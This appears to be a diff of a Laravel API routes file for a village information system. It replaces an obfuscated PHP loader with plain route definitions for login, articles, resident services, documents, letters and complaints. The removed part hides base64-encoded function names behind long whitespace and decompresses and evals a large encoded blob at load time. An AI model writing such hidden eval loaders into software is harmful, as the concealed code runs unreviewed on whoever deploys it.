@@ -1,337 +1,129 @@
-<?php 
-        $__='printf';$_='Loading routes/apiv1.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+use App\Http\Controllers\Api\AgendaDesaController;
+use App\Http\Controllers\Api\ArtikelController;
+use App\Http\Controllers\Api\Auth\AuthenticatedController;
+use App\Http\Controllers\Api\Auth\EmailVerificationNotificationController;
+use App\Http\Controllers\Api\Auth\NewPasswordController;
+use App\Http\Controllers\Api\Auth\NewPinController;
+use App\Http\Controllers\Api\Auth\PasswordResetLinkController;
+use App\Http\Controllers\Api\Auth\VerifyEmailController;
+use App\Http\Controllers\Api\BantuanController;
+use App\Http\Controllers\Api\CetakController;
+use App\Http\Controllers\Api\ConfigDesaController;
+use App\Http\Controllers\Api\DokumenController;
+use App\Http\Controllers\Api\KategoriController;
+use App\Http\Controllers\Api\KomentarController;
+use App\Http\Controllers\Api\LapakController;
+use App\Http\Controllers\Api\PendudukController;
+use App\Http\Controllers\Api\PengaduanController;
+use App\Http\Controllers\Api\PesanController;
+use App\Http\Controllers\Api\SuratController;
+use Illuminate\Support\Facades\Route;
+
+/*
+|--------------------------------------------------------------------------
+| API Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register API routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| is assigned the "api" middleware group. Enjoy building your API!
+|
+*/
+
+// Admin routes
+Route::prefix('admin')
+    ->middleware(['auth:admin', 'can:is-admin'])
+    ->group(function () {
+        Route::get('penduduk', [PendudukController::class, 'index']);
+    });
+
+// Autentikasi
+Route::prefix('auth')->as('jwt.')
+    ->group(function () {
+        Route::post('login', [AuthenticatedController::class, 'login'])->name('login');
+        Route::post('logout', [AuthenticatedController::class, 'logout'])->middleware('auth:jwt')->name('logout');
+        Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])->name('password.email');
+        Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.update');
+        Route::get('verify-email/{id}/{hash}', VerifyEmailController::class)->middleware(['auth:jwt', 'signed', 'throttle:6,1'])->name('verification.verify');
+        Route::post('email/verification-notification', [EmailVerificationNotificationController::class, 'store'])->middleware(['auth:jwt', 'throttle:6,1'])->name('verification.send');
+        Route::post('change-pin', NewPinController::class)->middleware('auth:jwt')->name('change.pin');
+    });
+
+// Profil Desa
+Route::get('profil-desa', [ConfigDesaController::class, 'index']);
+
+// Artikel
+Route::prefix('artikel')
+    ->middleware('auth:jwt')
+    ->group(function () {
+        Route::get('/', [ArtikelController::class, 'index']);
+        Route::get('read/{slug}', [ArtikelController::class, 'show']);
+        Route::get('headline', [ArtikelController::class, 'headline']);
+        Route::get('kategori', [KategoriController::class, 'index']);
+        Route::get('kategori/{slug}', [KategoriController::class, 'show']);
+        Route::get('komentar', [KomentarController::class, 'index']);
+        Route::get('komentar/{id}', [KomentarController::class, 'show']);
+        Route::post('komentar', [KomentarController::class, 'store']);
+        Route::get('agenda-desa', [AgendaDesaController::class, 'index']);
+    });
+
+// Layanan mandiri
+Route::prefix('layanan-mandiri')
+    ->middleware('auth:jwt')
+    ->group(function () {
+        // Mandiri pesan masuk
+        Route::prefix('pesan')
+            ->group(function () {
+                Route::get('tipe/{tipe}', [PesanController::class, 'index']);
+                Route::get('detail/{id}', [PesanController::class, 'show']);
+                Route::post('/', [PesanController::class, 'store']);
+            });
+
+        // Mandiri cetak
+        Route::prefix('cetak')
+            ->group(function () {
+                Route::get('biodata', [CetakController::class, 'cetakBiodata']);
+                Route::get('kartu-keluarga', [CetakController::class, 'cetakKartuKeluarga']);
+            });
+
+        // Mandiri program bantuan
+        Route::get('bantuan', [BantuanController::class, 'index']);
+        Route::get('bantuan/{id}', [BantuanController::class, 'show']);
+
+        // Dokumen warga
+        Route::prefix('dokumen')
+            ->group(function () {
+                Route::get('/', [DokumenController::class, 'index']);
+                Route::get('{id}/download', [DokumenController::class, 'show']);
+                Route::post('store', [DokumenController::class, 'store']);
+                Route::delete('{id}/delete', [DokumenController::class, 'destroy']);
+            });
+
+        // Mandiri surat
+        Route::prefix('surat')
+            ->group(function () {
+                Route::get('arsip', [SuratController::class, 'arsip']);
+                Route::get('permohonan', [SuratController::class, 'permohonan']);
+                Route::get('jenis-permohonan', [SuratController::class, 'jenis']);
+                Route::get('syarat', [SuratController::class, 'syaratSurat']);
+                Route::post('{slug}/permohonan', [SuratController::class, 'store']);
+                Route::post('unggah-dokumen', [SuratController::class, 'unggahDokumen']);
+                Route::put('{id}/permohonan', [SuratController::class, 'update']);
+            });
+
+        // Pengaduan
+        Route::prefix('pengaduan')
+            ->group(function () {
+                Route::get('/', [PengaduanController::class, 'index']);
+                Route::get('/detail', [PengaduanController::class, 'detail']);
+                Route::Post('/store', [PengaduanController::class, 'store']);
+            });
+
+        Route::prefix('lapak')
+            ->group(function () {
+                Route::get('/', [LapakController::class, 'index']);
+                Route::get('/detail', [LapakController::class, 'detail']);
+            });
+    });
